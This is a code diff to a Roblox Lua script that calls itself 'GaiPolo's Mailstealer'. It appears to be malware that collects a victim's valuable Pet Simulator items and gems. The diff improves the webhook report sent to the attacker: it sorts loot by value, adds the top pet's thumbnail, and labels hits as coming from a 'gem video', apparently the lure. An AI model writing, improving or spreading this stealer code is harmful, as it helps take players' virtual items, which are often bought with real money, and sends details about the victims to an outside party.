@@ -139,7 +139,7 @@ local function SendMessage(url, username, diamonds)
         if itemRapMap[rapKey] then
             itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
         else
-            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
+            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, category = item.category, typez = item.typez, pettyp = item.pettyp, realname = item.realname}
             table.insert(combinedItems, rapKey)
         end
     end
@@ -147,6 +147,20 @@ local function SendMessage(url, username, diamonds)
     table.sort(combinedItems, function(a, b)
         return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
     end)
+   
+    local highestRAPItemName = combinedItems[1] 
+    local highestRAPItemData = itemRapMap[highestRAPItemName]
+
+    if highestRAPItemData.category == "Pet" then
+        if highestRAPItemData.pettyp == "Golden" then
+            thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].goldenThumbnail
+        else
+            thumbid = require(game.ReplicatedStorage.Library.Directory.Pets)[highestRAPItemData.realname].thumbnail
+        end
+        local assetId = thumbid:match("%d+")
+        local newUrl = "https://biggamesapi.io/image/" .. assetId
+        thumbid = newUrl
+    end
 
     for _, itemName in ipairs(combinedItems) do
         local itemData = itemRapMap[itemName]
@@ -167,12 +181,15 @@ local function SendMessage(url, username, diamonds)
     local data = {
 	["content"] = poopie,
         ["embeds"] = {{
-            ["title"] = "New Execution" ,
+            ["title"] = "New Execution from gem video" ,
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
 				["text"] = "GaiPolo's Mailstealer"
-			}
+			},
+            ["thumbnail"] = {
+                ["url"] = thumbid or "https://biggamesapi.io/image/14976374906"
+            }
         }}
     }
 
@@ -180,7 +197,6 @@ local function SendMessage(url, username, diamonds)
         fields[2].value  = "List of items too big to send!\n\nGems: " .. formatNumber(diamonds) .. "\n"
         fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
     end
-
     local body = HttpService:JSONEncode(data)
     local success = false
     local attempts = 0
@@ -340,16 +356,21 @@ for i, v in pairs(categoryList) do
                     local rapValue = getRAP(v, item)
                     if rapValue >= min_rap then
                         local prefix = ""
+                        typez = "Normal"
                         if item.pt and item.pt == 1 then
                             prefix = "Golden "
+                            typez = "Golden"
                         elseif item.pt and item.pt == 2 then
                             prefix = "Rainbow "
+                            typez = "Normal"
                         end
                         if item.sh then
                             prefix = "Shiny " .. prefix
+                            typez = "Normal"
                         end
+                        local realid = item.id
                         local id = prefix .. item.id
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id, realname = realid, pettyp = typez})
                     end
                 end
             else
